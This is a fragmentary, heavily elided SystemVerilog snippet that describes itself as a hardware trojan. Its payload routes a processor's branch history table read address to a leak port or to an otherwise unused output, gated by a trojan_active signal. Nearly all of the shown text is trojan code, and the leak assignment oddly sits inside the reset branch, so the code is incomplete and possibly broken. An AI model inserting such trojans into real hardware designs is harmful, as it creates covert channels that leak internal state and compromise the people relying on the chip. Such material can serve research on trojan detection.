 ...
 * Payload: Route bht_ram_read_address_0 to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= bht_ram_read_address_0;
    end
end
...
// ============================================================
// Information Leak: Route bht_ram_read_address_0 to unused output
//
...
//   Replace: assign output_signal = trojan_active ? bht_ram_read_address_0 : normal_value;